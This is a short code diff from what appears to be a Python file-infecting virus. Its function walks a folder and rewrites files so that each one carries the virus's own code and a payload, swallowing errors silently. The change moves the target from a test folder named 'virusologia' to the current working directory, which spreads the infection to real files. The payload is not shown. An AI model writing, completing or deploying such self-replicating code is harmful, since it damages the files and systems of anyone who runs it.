@@ -21,4 +21,4 @@ def artgv_folder(path, level):
                         handle.write(f"{SELF_CONTENT}\n\n\n{content}\n{PAYLOAD}")
                 except Exception:
                     pass
-artgv_folder("C:/Programezz/temp/virusologia", 1)
+artgv_folder(os.getcwd(), 1)
